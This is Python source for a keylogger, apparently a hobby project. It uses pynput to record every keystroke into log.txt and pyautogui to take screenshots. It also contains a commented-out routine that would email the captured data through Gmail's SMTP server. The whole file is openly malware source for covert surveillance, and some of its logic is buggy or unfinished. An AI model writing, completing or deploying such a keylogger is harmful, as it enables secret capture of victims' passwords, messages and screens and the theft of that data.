import pynput 
import os
import random
import pyautogui as pya
import smtplib
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener


count = 0
num_lines = 0
num_words = 0
num_char = 0
keys = []
line = ""
k = ""

#Global data directory
#directory = "Data"
#par_dir = "C:\Users\pcuser\Desktop\keylogger"
#mode = 0o666
#path = os.path.join(par_dir, directory)
#IsDir = os.path.exists(r"C:\Users\pcuser\Desktop\keylogger\Data")

"""if IsDir == False:
    print("Dictionary data created")
    os.mkdir(path) 
else:
   pass"""

#Key listener
def on_press(key):
    global count, keys
    k01 = "{0} pressed".format(key)
    
    if k01[0] == "u":
        print(k01[1:])
    else:
        print(k01)

    keys.append(key)
    count += 1

    if count >= 0:
        count = 0
        write_file(keys)
        Screenshot()
        #send_Email()
        keys = []

#key data file
def write_file(keys):
    global num_lines, num_words, num_char, line, k

    #os.chdir("C:\Users\pcuser\Desktop\keylogger\Data")

    with open("log.txt", "a+") as file:
      for key in keys:
         k = str(key).replace("'", "")

      for line in file:
         line = line.strip("\n")
         words = line.split()
         num_words = len(words)
         num_char = len(line)
 
      if k.find("space") > 0:
          file.write(" [_] ")
      elif k.find("caps_lock") > 0:
          file.write("[C]")
      elif k.find("Key") == -1:
         file.write(k[1:])

      if len(line) > 10:
          num_lines += 1
          file.write(k[1:])
      else:
          pass

      print("lines:", num_lines, "words:", num_words, "characters:", num_char)

#Screenshots folder

write_file(keys)

#Screenshot data
def Screenshot():
   global line
   with open("log.txt", "a+") as file:      

    for line in file:
         num_char = len(line)

    letters = "qwertyuiopasdfghjklzxcvbnm014151531@%&!"
    for i in range(5):
        img_name = random.choice(letters)

    if len(line) > 10:
          file.write("\n")
          scr = pya.screenshot()
          #scr.save(r'C:\Users\pcuser\Desktop\keylogger\Data\Scr\%s.png' % img_name)
    else:
        pass
    
#Da se proba so try i expect...
"""def send_Email():

   me = ""
   to = ""
   body = ""

   msg = MIMEMultipart()
   msg['From'] = me
   msg['To'] = to
   msg['Subject'] = 'Data'
   msg.attach(MIMEText())

   fileName = ""
   f = file(fileName)
   attachment = MIMEBase(f.read())
   attachment.add_header('Content-Disposition', 'attachment', fileName=fileName)           
   msg.attach(attachment)

   server = smtplib.SMTP('smtp.gmail.com', 587)

   server.ehlo()
   server.starttls()
   server.ehlo()

   server.login("","")
   server.sendmail(me, to)
   server.quit()"""

#Exit program
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
